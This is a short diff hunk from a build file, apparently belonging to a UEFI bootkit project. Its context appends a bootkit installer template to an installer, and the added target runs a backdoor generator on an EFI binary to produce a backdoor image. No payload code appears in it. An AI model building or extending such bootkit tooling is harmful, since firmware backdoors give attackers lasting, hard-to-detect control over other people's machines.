@@ -41,3 +41,5 @@ installer:
 # rest of the installer code
 	type .\resources\bootkit_installer_template.ps1 >> $(INSTALLER)
 
+bin:
+	python backdoor_gen.py --bin $(PROJ)_$(ARCH_64).efi --pdb $(PROJ)_$(ARCH_64).pdb --output backdoor.bin
